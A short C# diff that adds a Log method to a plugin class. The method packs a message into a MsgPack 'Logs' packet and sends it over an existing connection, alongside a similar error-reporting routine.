@@ -55,6 +55,14 @@ namespace Plugin
             msgpack.ForcePathObject("Error").AsString = ex;
             Connection.Send(msgpack.Encode2Bytes());
         }
+
+        public static void Log(string message)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Logs";
+            msgpack.ForcePathObject("Message").AsString = message;
+            Connection.Send(msgpack.Encode2Bytes());
+        }
     }
 
 }
